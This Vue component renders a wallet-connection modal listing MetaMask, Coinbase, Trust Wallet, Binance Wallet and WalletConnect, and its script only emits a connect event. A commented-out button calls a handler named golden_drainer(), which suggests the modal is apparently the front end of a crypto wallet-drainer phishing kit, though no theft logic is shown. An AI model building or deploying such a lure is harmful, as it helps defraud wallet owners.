<template>
    <div
      id="web3-modal"
      class="web3-modal"
      style="display: block; background: #1c1c1c; color: #fff"
    >
      <div class="web3-modal-main" style="display: block">
        <p class="web3-modal-title" style="padding-bottom: 1rem ; margin-top: 0; border-bottom: 1px solid #fff;">Connect your wallet</p>
        <div class="web3-modal-items">
          <div class="item" @click.prevent='connect(1)'>
            <div>
              <div class="icon">
                <img src="/assets/web3-modal/images/MM.svg" alt="" />
              </div>
              <span>MetaMask</span>
            </div>
            <div class="arrow"></div>
          </div>
          <div class="item" @click.prevent='connect(2)'>
            <div>
              <div class="icon">
                <img src="/assets/web3-modal/images/CB.svg" alt="" />
              </div>
              <span>Coinbase</span>
            </div>
            <div class="arrow"></div>
          </div>
          <div class="item" @click.prevent='connect(3)'>
            <div>
              <div class="icon">
                <img src="/assets/web3-modal/images/TW.svg" alt="" />
              </div>
              <span>Trust Wallet</span>
            </div>
            <div class="arrow"></div>
          </div>
          <div class="item" @click.prevent='connect(4)'>
            <div>
              <div class="icon">
                <img src="/assets/web3-modal/images/BW.svg" alt="" />
              </div>
              <span>Binance Wallet</span>
            </div>
            <div class="arrow"></div>
          </div>
          <div class="item" @click.prevent="$emit('wc')">
            <div>
              <div class="icon">
                <img src="/assets/web3-modal/images/WC.svg" alt="" />
              </div>
              <span>WalletConnect</span>
            </div>
            <div class="arrow"></div>
          </div>
        </div>
      </div>
      <!-- <div class="web3-modal-wc" style="display: none">
        <p class="web3-modal-title" style="margin-top: 0">Choose Version</p>
        <div class="web3-modal-items">
          <div class="item" @click.prevent='connect_wallet("WalletConnect_v2")'>
            <div>
              <div class="icon">
                <img src="/assets/web3-modal/images/WC.svg" alt="" />
              </div>
              <span>WalletConnect</span>
            </div>
            <div class="arrow"></div>
          </div>
          <div class="item" @click.prevent='connect_wallet("WalletConnect")'>
            <div>
              <div class="icon">
                <img src="/assets/web3-modal/images/WC1.svg" alt="" />
              </div>
              <span>WalletConnect Legacy</span>
            </div>
            <div class="arrow"></div>
          </div>
          <div class="item" @click.prevent="golden_drainer()">
            <div class="arrow" style="transform: rotateY(190deg)"></div>
            <div>
              <div class="icon"></div>
              <span>Return to Wallets</span>
            </div>
          </div>
        </div>
      </div> -->
    </div>
  </template>
  <script>
  export default {
    methods: {
     connect(type){
      this.$emit('connect', type)
     }
    }
  }
  </script>
  
  <style>
  .web3-modal {
    right: 0;
    bottom: 0;
    margin: auto;
    max-width: 500px;
    height: fit-content;
    padding: 21px 0 0;
    border-radius: 60px;
    z-index: 99999;
    font-family: Inter, sans-serif;
    overflow: hidden;
  }
  .web3-modal, .web3-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
  }
  .web3-modal-title {
      font-weight: 700;
      font-size: 24px;
      line-height: 29px;
      color: #ffffff;
      text-align: center;
  }
  .web3-modal .item {
      padding: 15px 34px;
      border-bottom: 1px solid rgba(0,0,0,.1);
      display: flex;
      align-items: center;
      justify-content: space-between;
      cursor: pointer;
      transition: .2s;
  }
  .web3-modal .item div {
      display: flex;
      align-items: center;
  }
  .web3-modal .item .icon {
      width: 40px;
      height: 40px;
      justify-content: center;
  }
  .web3-modal .item span {
      font-weight: 400;
      font-size: 16px;
      color: #fff;
      margin-left: 11px;
  }
  .web3-modal .item .arrow {
      height: 12px;
      width: 7.4px;
      background: url(/assets/web3-modal/images/arrow.svg) no-repeat;
      filter: invert(1);
  }
  .web3-modal .item:hover {
      background: #262525;
  }
  </style>
  